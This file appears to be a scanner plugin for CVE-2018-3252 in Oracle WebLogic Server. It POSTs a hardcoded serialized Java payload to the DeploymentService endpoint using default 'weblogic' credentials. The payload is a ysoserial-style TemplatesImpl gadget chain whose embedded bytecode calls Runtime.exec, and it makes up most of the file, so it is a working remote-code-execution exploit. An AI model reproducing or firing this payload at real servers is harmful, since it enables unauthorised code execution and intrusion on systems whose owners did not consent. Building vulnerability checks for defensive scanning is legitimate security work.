#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2018-3252
# updated 2019/10/23
#


import pathlib
import sys
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except:
    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return {
            'name': 'Oracle WebLogic Server WLS Core Components Access Control',
            'catalog': 'CVE-2018-3252',
            'itype': PLUGIN_TYPE.MODULE,
            'protocols': ['http', 'https'],
            'port': '7001',
        }

    def run(self, url: urlutil.Url, *args, **kwargs) -> Tuple[bool, Any]:
        '''
        输入 url 时，如果是这种写法 http://admin:admin@localhost.com/ 会正确识别账号密码
        '''
        headers = {
            'Host': '127.0.0.1:7001',
            'wl_request_type': 'data_transfer_request',
            'Username': url.username or 'weblogic',
            'Password': url.password or 'weblogic',
        }
        url = url.join('/bea_wls_deployment_internal/DeploymentService')
        data = b'sr\x00\x17java.util.LinkedHashSet\xd8l\xd7Z\x95\xdd*\x1e\x02\x00\x00w\x02\x00\x00xr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00w\x02\x00\x00xpw\x0c\x00\x00\x00\x10?@\x00\x00\x00\x00\x00\x02sr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\tI\x00\r_indentNumberI\x00\x0e_transletIndexZ\x00\x15_useServicesMechanismL\x00\x19_accessExternalStylesheett\x00\x12Ljava/lang/String;L\x00\x0b_auxClassest\x00;Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x04L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;w\x02\x00\x00xp\x00\x00\x00\x00\xff\xff\xff\xff\x00t\x00\x03allpur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00w\x02\x00\x00xp\x00\x00\x00\x02ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00w\x02\x00\x00xp\x00\x00\x08<\xca\xfe\xba\xbe\x00\x00\x003\x00W\n\x00\x03\x00"\x07\x00U\x07\x00%\x07\x00&\x01\x00\x10serialVersionUID\x01\x00\x01J\x01\x00\rConstantValue\x05\xad \x93\xf3\x91\xdd\xef>\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x13StubTransletPayload\x01\x00\x0cInnerClasses\x01\x005Lysoserial/payloads/util/Gadgets$StubTransletPayload;\x01\x00\ttransform\x01\x00r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\x08document\x01\x00-Lcom/sun/org/apache/xalan/internal/xsltc/DOM;\x01\x00\x08handlers\x01\x00B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\nExceptions\x07\x00\'\x01\x00\xa6(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\x08iterator\x01\x005Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;\x01\x00\x07handler\x01\x00ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\nSourceFile\x01\x00\x0cGadgets.java\x0c\x00\n\x00\x0b\x07\x00(\x01\x003ysoserial/payloads/util/Gadgets$StubTransletPayload\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x01\x00\x14java/io/Serializable\x01\x009com/sun/org/apache/xalan/internal/xsltc/TransletException\x01\x00\x1fysoserial/payloads/util/Gadgets\x01\x00\x08<clinit>\x01\x00\x11java/lang/Runtime\x07\x00*\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x0c\x00,\x00-\n\x00+\x00.\x01\x00\x04calc\x08\x000\x01\x00\x04exec\x01\x00\'(Ljava/lang/String;)Ljava/lang/Process;\x0c\x002\x003\n\x00+\x004\x01\x00\x13java/lang/Exception\x07\x006\x01\x00\x10java/lang/System\x07\x008\x01\x00\x03out\x01\x00\x15Ljava/io/PrintStream;\x0c\x00:\x00;\t\x009\x00<\x01\x00\x0fcmd_exit_code=0\x08\x00>\x01\x00\x10cmd_exit_code=-1\x08\x00@\x01\x00\x13java/io/PrintStream\x07\x00B\x01\x00\x07println\x01\x00\x15(Ljava/lang/String;)V\x0c\x00D\x00E\n\x00C\x00F\x0c\x00:\x00;\t\x009\x00H\x08\x00>\x08\x00@\x0c\x00D\x00E\n\x00C\x00L\x01\x00\x11java/lang/Process\x07\x00N\x01\x00\x13java/lang/Throwable\x07\x00P\x01\x00\x10java/lang/String\x07\x00R\x01\x00\rStackMapTable\x01\x00\x1eysoserial/Pwner227212692112939\n\x00\x03\x00"\x00!\x00\x02\x00\x03\x00\x01\x00\x04\x00\x01\x00\x1a\x00\x05\x00\x06\x00\x01\x00\x07\x00\x00\x00\x02\x00\x08\x00\x04\x00\x01\x00\n\x00\x0b\x00\x01\x00\x0c\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00V\xb1\x00\x00\x00\x02\x00\r\x00\x00\x00\x06\x00\x01\x00\x00\x00\x83\x00\x0e\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x00\x0f\x00\x12\x00\x00\x00\x01\x00\x13\x00\x14\x00\x02\x00\x0c\x00\x00\x00?\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\r\x00\x00\x00\x06\x00\x01\x00\x00\x00\x8b\x00\x0e\x00\x00\x00 \x00\x03\x00\x00\x00\x01\x00\x0f\x00\x12\x00\x00\x00\x00\x00\x01\x00\x15\x00\x16\x00\x01\x00\x00\x00\x01\x00\x17\x00\x18\x00\x02\x00\x19\x00\x00\x00\x04\x00\x01\x00\x1a\x00\x01\x00\x13\x00\x1b\x00\x02\x00\x0c\x00\x00\x00I\x00\x00\x00\x04\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\r\x00\x00\x00\x06\x00\x01\x00\x00\x00\x8f\x00\x0e\x00\x00\x00*\x00\x04\x00\x00\x00\x01\x00\x0f\x00\x12\x00\x00\x00\x00\x00\x01\x00\x15\x00\x16\x00\x01\x00\x00\x00\x01\x00\x1c\x00\x1d\x00\x02\x00\x00\x00\x01\x00\x1e\x00\x1f\x00\x03\x00\x19\x00\x00\x00\x04\x00\x01\x00\x1a\x00\x08\x00)\x00\x0b\x00\x01\x00\x0c\x00\x00\x00\xbd\x00\x05\x00\x04\x00\x00\x00?\xa7\x00\x03\x01L\x01M\xb8\x00/\x121\xb6\x005M\xa7\x00\x1cN\xa7\x00\x18N\xb2\x00=,\x01\xa5\x00\x08\x12?\xa7\x00\x05\x12A\xb6\x00G-\xbf\xb2\x00I,\x01\xa5\x00\x08\x12J\xa7\x00\x05\x12K\xb6\x00M\xb1\x00\x02\x00\x07\x00\x10\x00\x13\x007\x00\x07\x00\x17\x00\x17\x00\x00\x00\x01\x00T\x00\x00\x00\\\x00\x08\x03\xff\x00\x0f\x00\x03\x00\x00\x07\x00O\x00\x01\x07\x007C\x07\x00Q\xff\x00\r\x00\x04\x00\x00\x00\x07\x00Q\x00\x01\x07\x00C\xff\x00\x01\x00\x04\x00\x00\x00\x07\x00Q\x00\x02\x07\x00C\x07\x00S\xff\x00\x04\x00\x03\x00\x00\x07\x00O\x00\x00\xff\x00\x0c\x00\x00\x00\x01\x07\x00C\xff\x00\x01\x00\x00\x00\x02\x07\x00C\x07\x00S\x00\x02\x00 \x00\x00\x00\x02\x00!\x00\x11\x00\x00\x00\n\x00\x01\x00\x02\x00#\x00\x10\x00\tuq\x00~\x00\r\x00\x00\x01\xd4\xca\xfe\xba\xbe\x00\x00\x003\x00\x1b\n\x00\x03\x00\x15\x07\x00\x17\x07\x00\x18\x07\x00\x19\x01\x00\x10serialVersionUID\x01\x00\x01J\x01\x00\rConstantValue\x05q\xe6i\xee<mG\x18\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x03Foo\x01\x00\x0cInnerClasses\x01\x00%Lysoserial/payloads/util/Gadgets$Foo;\x01\x00\nSourceFile\x01\x00\x0cGadgets.java\x0c\x00\n\x00\x0b\x07\x00\x1a\x01\x00#ysoserial/payloads/util/Gadgets$Foo\x01\x00\x10java/lang/Object\x01\x00\x14java/io/Serializable\x01\x00\x1fysoserial/payloads/util/Gadgets\x00!\x00\x02\x00\x03\x00\x01\x00\x04\x00\x01\x00\x1a\x00\x05\x00\x06\x00\x01\x00\x07\x00\x00\x00\x02\x00\x08\x00\x01\x00\x01\x00\n\x00\x0b\x00\x01\x00\x0c\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x02\x00\r\x00\x00\x00\x06\x00\x01\x00\x00\x00}\x00\x0e\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x00\x0f\x00\x12\x00\x00\x00\x02\x00\x13\x00\x00\x00\x02\x00\x14\x00\x11\x00\x00\x00\n\x00\x01\x00\x02\x00\x16\x00\x10\x00\tpt\x00\x04Pwnrpw\x01\x00xs}\x00\x00\x00\x01\x00\x1djavax.xml.transform.Templatesw\x02\x00\x00xr\x00\x17java.lang.reflect.Proxy\xe1\'\xda \xcc\x10C\xcb\x02\x00\x01L\x00\x01ht\x00%Ljava/lang/reflect/InvocationHandler;w\x02\x00\x00xpsr\x002sun.reflect.annotation.AnnotationInvocationHandlerU\xca\xf5\x0f\x15\xcb~\xa5\x02\x00\x02L\x00\x0cmemberValuest\x00\x0fLjava/util/Map;L\x00\x04typet\x00\x11Ljava/lang/Class;w\x02\x00\x00xpsr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdw\x02\x00\x00xp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01t\x00\x08f5a5a608q\x00~\x00\txvr\x00\x1djavax.xml.transform.Templates\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00w\x02\x00\x00xpx'

        err, response = self.http.rq(url.string(), 'POST', headers=headers, data=data, timeout=5)
        if err:
            return False, err
        return response.status_code == 401 or response.status_code == 500, response.text


if __name__ == '__main__':
    import time

    from utils import net_echo

    nc = net_echo.DnslogCn()
    nc.start_service()
    plugin = Plugin(nc)

    s_time = time.time()
    ret = plugin.do_testing('192.168.245.128')
    print(ret)
    print(ret['is_exists'])
    print('total time(s):', time.time() - s_time)
